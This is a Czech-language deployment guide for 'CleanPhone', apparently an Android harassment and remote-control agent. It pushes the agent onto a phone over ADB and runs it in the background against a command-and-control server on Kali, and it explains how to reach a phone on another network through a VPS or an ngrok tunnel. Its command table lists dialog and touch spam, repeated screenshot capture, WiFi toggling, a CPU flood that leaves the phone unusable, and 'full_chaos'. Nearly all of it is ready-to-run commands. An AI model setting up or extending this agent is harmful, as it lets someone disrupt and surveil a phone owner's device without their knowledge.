# CleanPhone — nasazení na „čistý" telefon (bez Termux/Pydroid)

Tvoje otázka: **telefon je čistý (žádné speciální appky), tak jak na to?**

Odpověď: **nepotřebuješ na telefonu žádný interpret ani appku.**
Agent je jediný statický binár (`dist/agent-arm64`), který se pushne přes ADB
do `/data/local/tmp` a spustí se z shellu. Android ho spustí nativně — je to
obyvatelný ELF pro aarch64.

Ověřeno na bináru:
```
dist/agent-arm64: ELF 64-bit LSB pie, ARM aarch64, interpreter /system/bin/linker64,
                  statically linked  (žádné NEEDED knihovny)
```

---

## 0) Předpoklady (jednorázově)

Na PC s ADB (Kali):
```bash
sudo apt install -y android-tools-adb
```
Na telefonu: **Nastavení → O telefonu → 7× klepnout na číslo sestavení** (odemkne Vývojářské možnosti),
pak **Vývojářské možnosti → Ladění USB = ZAP**.
Připoj kabelem, na telefonu potvrď „Povolit ladění USB".

Ověření:
```bash
adb devices        # musí vypsat tvé zařízení
```

---

## 1) Příprava C2 serveru (na Kali, ve stejné WiFi)

```bash
cd cleanphone/qr-c2
python3 c2-qr.py
# vypíše: Dashboard http://<TVA_LAN_IP>:8080  a  Task feed /push
ip -4 addr show | grep inet      # zjisti svou LAN IP, např. 192.168.1.50
```

## 2) Push agenta na telefon (čistý, bez appek)

```bash
# zkopíruj binár do dočasného adresáře, který je spustitelný
adb push dist/agent-arm64 /data/local/tmp/agent
adb shell chmod 755 /data/local/tmp/agent

# spusť agenta v poll režimu proti svému C2
adb shell /data/local/tmp/agent -mode poll -c2 http://192.168.1.50:8080 -id redmi
```

> Tip: když chceš, aby agent běžel na pozadí i po odpojení ADB:
> ```bash
> adb shell "nohup /data/local/tmp/agent -mode poll -c2 http://192.168.1.50:8080 -id redmi >/dev/null 2>&1 &"
> ```

## 3) Ovládání z Kali (řídící terminál)

```bash
# ověř, že se agent hlásí
curl http://192.168.1.50:8080/queue

# zařaď příkaz
curl "http://192.168.1.50:8080/push?id=redmi&cmd=info"
curl "http://192.168.1.50:8080/push?id=redmi&cmd=full_chaos"
curl "http://192.168.1.50:8080/push?id=redmi&cmd=stop"     # nouzové zastavení
```

Nebo otevři v prohlížeči `http://192.168.1.50:8080/` → dashboard s tlačítky:
`info, dialog_spam, touch_spam, screenshot_loop, wifi_toggle, cpu_flood,
app_spam, vibrate, full_chaos, stop`

Agent polluje každých 10 s → příkaz se vyzvedne do 10 s a výsledek se zapíše
do `c2.log` (sekce „Evidence").

---

## Dostupné příkazy agenta

| Příkaz | Co dělá (na reálném Androidu) |
|---|---|
| `info` | `getprop ro.product.model` + verze Androidu |
| `dialog_spam:N` | otevírá systémové dialogy v cyklu (obtěžuje) |
| `touch_spam:N` | simuluje N dotyků (`input tap`) |
| `screenshot_loop:N` | opakované screenshoty (zátěž + sběr) |
| `wifi_toggle:N` | vypíná/zapíná WiFi (`svc wifi`) |
| `cpu_flood:N` | N busy-loop procesů → CPU 100 %, telefon „mrtvý" |
| `app_spam:N` | opakovaně spouští systémové aktivity |
| `vibrate:N` | N× vibrace |
| `full_chaos` | všechny vektory paralelně |
| `stop` | zabije chaos procesy (nouzové zastavení) |

> `getprop: not found` v logu při testu na Linuxu je normální — ta utilita je
> jen na Androidu. Na reálném Redmi vrátí model a verzi.

---

## Scénář „jiná síť" (telefon na 4G, ty jinde)

Poll režim komunikuje **směrem ven** (telefon → server), takže projde NATem.
Potřebuješ jen, aby C2 bylo dosažitelné z internetu:

**Varianta A – veřejné VPS:** spusť `c2.py` na VPS s veřejnou IP:
```bash
adb shell /data/local/tmp/agent -mode poll -c2 http://<VPS_IP>:8080 -id redmi
```

**Varianta B – ngrok tunel z Kali (bez VPS):**
```bash
ngrok http 8080          # dostaneš https://xxxx.ngrok-free.app
adb shell /data/local/tmp/agent -mode poll -c2 https://xxxx.ngrok-free.app -id redmi
```

---

## Build agenta (když chceš změnit příkazy)

```bash
cd cleanphone
./build.sh      # vytvoří dist/agent-arm64 + dist/agent-linux
```
Zdroj: `agent/main.go` (funkce `dispatch` = seznam příkazů).
